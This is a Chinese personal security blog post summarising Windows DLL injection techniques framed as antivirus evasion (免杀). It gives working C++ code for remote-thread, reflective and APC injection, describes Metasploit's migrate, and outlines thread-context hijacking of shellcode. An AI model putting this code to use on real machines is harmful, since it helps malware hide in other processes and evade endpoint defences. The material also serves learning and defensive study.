<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【免杀】DLL注入小结</title><meta name="description" content="&lt;p&gt;DLL 注入进化史&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【免杀】DLL注入小结</h3><div class="article__date metadata"><div class="post-info">2023/07/17</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/malware/">malware</a><a class="article__tags__link metadata" href="/tags/C/">C</a></div><div class="article__body"><p>DLL 注入进化史</p>
<span id="more"></span>
<h1 id="远程线程调用注入"><a class="markdownIt-Anchor" href="#远程线程调用注入"></a> 远程线程调用注入</h1>
<p>这个是最简单的</p>
<p>这里我接受的是程序的进程<code>PID</code>和待注入DLL的路径<code>szPath</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DLLinjector::DllOnLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;<span class="built_in">Check</span>())&#123;</span><br><span class="line">		wcout &lt;&lt; <span class="string">&quot;The Process or DLL file not found\n&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//向目标进程写入DLL的路径</span></span><br><span class="line">	SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="keyword">this</span>-&gt;dwPid);</span><br><span class="line">	LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;szPath, <span class="built_in">wcslen</span>(<span class="keyword">this</span>-&gt;szPath)*<span class="number">2</span>+<span class="number">2</span>, &amp;dwWriteSize);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//从ntdll导出 LoadLibraryA 函数</span></span><br><span class="line">	HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    </span><br><span class="line">	HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放资源</span></span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">	<span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line"></span><br><span class="line">	wcout &lt;&lt; <span class="string">&quot;injection complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/ab29867d886c12b9b42013810ad19cbc.png" alt="image-20230717205213381" /></p>
<h1 id="反射dll注入"><a class="markdownIt-Anchor" href="#反射dll注入"></a> 反射DLL注入</h1>
<p>这里找了一张先知的图，上面说了反射DLL注入的流程，原文在这里<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11072">https://xz.aliyun.com/t/11072</a></p>
<p><img src="https://img.joe1sn.top/uploads/big/8ac2e3d0d3139da37de7067a9a9d8e51.png" alt="image-20230717210533079" /></p>
<p>最大的区别就是我们没有使用<code>LoadLibarary</code>这个函数，而是相当于自己写了一个DLL加载器</p>
<p>仔细观察过程就看得出来，<strong>远程线程调用注入</strong>写入的是DLL路径，然后创建远程调用<code>LoadLibarary</code>（LPTHREAD_START_ROUTINE）</p>
<p><strong>反射DLL注入</strong>是将整个文件解析过后，获得必要的dll句柄和函数为修复导入表做准备，分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中，修复导入表和重定向表，执行DllMain()函数。</p>
<p>群里聊到了进程迁移技术，msf上的migrate原理就是反射DLL注入</p>
<ol>
<li>
<p>读取metsrv.dll（metpreter payload模板dll）文件到内存中。</p>
</li>
<li>
<p>生成最终的payload。</p>
<p>a) msf生成一小段汇编migrate stub主要用于建立socket连接。</p>
<p>b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。</p>
<p>c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。</p>
</li>
<li>
<p>向msf server发送migrate请求和payload。</p>
</li>
<li>
<p>msf向迁移目标进程分配一块内存并写入payload。</p>
</li>
<li>
<p>msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。</p>
</li>
<li>
<p>reflective loader进行反射式dll注入。</p>
</li>
<li>
<p>最后msf client和msf server建立一个新的session。</p>
</li>
</ol>
<p>这里就不自己写了，参考的是<a target="_blank" rel="noopener" href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
<p>首先需要描述的就是DLL的解析过程</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( !hProcess  || !lpBuffer || !dwLength )</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// check if the library has a ReflectiveLoader...</span></span><br><span class="line">	dwReflectiveLoaderOffset = <span class="built_in">GetReflectiveLoaderOffset</span>( lpBuffer );</span><br><span class="line">	<span class="keyword">if</span>( !dwReflectiveLoaderOffset )</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// alloc memory (RWX) in the host process for the image...</span></span><br><span class="line">	lpRemoteLibraryBuffer = <span class="built_in">VirtualAllocEx</span>( hProcess, <span class="literal">NULL</span>, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class="line">	<span class="keyword">if</span>( !lpRemoteLibraryBuffer )</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// write the image into the host process...</span></span><br><span class="line">	<span class="keyword">if</span>( !<span class="built_in">WriteProcessMemory</span>( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, <span class="literal">NULL</span> ) )</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// add the offset to ReflectiveLoader() to the remote library address...</span></span><br><span class="line">	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a remote thread in the host process to call the ReflectiveLoader!</span></span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>( hProcess, <span class="literal">NULL</span>, <span class="number">1024</span>*<span class="number">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)<span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="number">0</span> );</span><br></pre></td></tr></table></figure>
<p><code>lpBuffer</code>就是读取到内存中的DLL的数据</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// uiNameArray = the address of the modules export directory entry</span></span><br><span class="line">uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">uiExportDir = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">uiNameArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">uiNameOrdinals = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );	</span><br><span class="line"></span><br><span class="line"><span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line"><span class="comment">// loop through all the exported functions to find the ReflectiveLoader</span></span><br><span class="line"><span class="keyword">while</span>( dwCounter-- )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * cpExportedFunctionName = (<span class="type">char</span> *)(uiBaseAddress + <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiNameArray ), uiBaseAddress ));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">strstr</span>( cpExportedFunctionName, <span class="string">&quot;ReflectiveLoader&quot;</span> ) != <span class="literal">NULL</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">		uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );	</span><br><span class="line"></span><br><span class="line">		<span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">		uiAddressArray += ( <span class="built_in">DEREF_16</span>( uiNameOrdinals ) * <span class="built_in">sizeof</span>(DWORD) );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// return the File Offset to the ReflectiveLoader() functions code...</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiAddressArray ), uiBaseAddress );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// get the next exported function name</span></span><br><span class="line">	uiNameArray += <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// get the next exported function name ordinal</span></span><br><span class="line">	uiNameOrdinals += <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><code>GetReflectiveLoaderOffset</code>就是解析文件头找到DLL的导出表，如果发现<code>ReflectiveLoader</code>的函数，那么返回在<code>hProcess</code>的内存文件中的位置</p>
<p>然后回到<code>LoadRemoteLibraryR</code>使用<code>CreateRemoteThread</code>进行注入</p>
<p>关于RVA和VA的计算可以参考我很早写的一篇博客：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/231206f9fbaf">PE文件结构中的RVA与RAW</a></p>
<p>现在可以看一下他的DLL是如何构造的</p>
<p>首先存在一个导出函数</p>
<p><img src="https://img.joe1sn.top/uploads/big/5f38a3c3481e227dd4bc7785f3ab41ca.png" alt="image-20230718084605818" /></p>
<p>通过阅读这个函数的代码发现</p>
<ol>
<li>使用<code>_ReturnAddress</code>获得调用完成的返回地址，反推初DLL的基地址</li>
<li>通过PEB得到<code>LoadLibraryA</code>、<code>GetProcAddress</code>、<code>VirtualAlloc</code>，使用<code>NtFlushInstructionCache</code>暂时存储其他导入表的函数</li>
<li>迁移之前的DLL镜像到新的位置</li>
<li>覆写迁移后的文件头的节区位置</li>
<li>使用刚才导入的<code>LoadLibraryA</code>、<code>GetProcAddress</code>修复IAT</li>
<li>处理重定向相关</li>
<li>找到DLLMain并跳转后执行</li>
</ol>
<h1 id="apc注入"><a class="markdownIt-Anchor" href="#apc注入"></a> APC注入</h1>
<p>在最开始的远程线程调用注入使用的是<code>TH32CS_SNAPPROCESS</code>，这里就是利用<code>KiUserDispatch</code>调度进行APC例程调用，让线程使用<code>LoadLibarary</code>进行注入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThreadSnap) &#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;Error In APC Injection\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL bStat = FALSE;</span><br><span class="line"><span class="comment">//得到第一个线程</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (te.th32OwnerProcessID == <span class="keyword">this</span>-&gt;dwPid) &#123;</span><br><span class="line">			HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">			<span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">				DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress);</span><br><span class="line">				<span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)	bStat = TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/54c47164be9d9b6e6bf4a8a34377b787.png" alt="image-20230718092010464" /></p>
<p>还有一个技巧就是使用NTDLL中的未导出函数<code>NtTestAlert</code>就可以立即调用APC例程</p>
<p><strong>上面的把<code>hProcess = GetCurrentProcess()</code>，<code>pAddress = shellcode_Address</code>相当于使用DLL注入进行免杀了</strong></p>
<h1 id="上下文注入"><a class="markdownIt-Anchor" href="#上下文注入"></a> 上下文注入</h1>
<p>之前在写PE加载器的时候就想到了这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了</p>
<p>问题在于shellcode还有计算各种偏移，个人觉得涉及shellcode和汇编较多，就不再本篇文章赘述</p>
<p>用到的主要WINAPI就是</p>
<ol>
<li>创建会shellcode裸函数（<code>__declspec(naked)</code>）,导出<code>LoadLibrary</code>等函数</li>
<li><code>OpenProcess</code>后再<code>OpenThread</code>，使用<code>SuspendThread</code>暂停线程</li>
<li>创建类型为<code>CONTEXT</code>的变量，初始化<code>context.ContextFlags=CONTEXT_FULL</code></li>
<li><code>GetThreadContext</code>获得上下文</li>
<li><code>VirualAlloc</code>获得空间，类似<code>RtlMoveMemory</code>这种复制shellcode到空间</li>
<li>将<code>context.eip = shellcode_addr</code>，使用<code>SetThreadContext</code>重新设置上下文，<code>ResumeThread</code>恢复线程</li>
</ol>
<p>内核中的过程差不多，不过更多的是不一样的API</p>
</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
(function () {
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/18/win-afl/">prev_post</a><a class="pagination__link pagination__next" href="/2023/07/12/win-pwn-stack2/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2023 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>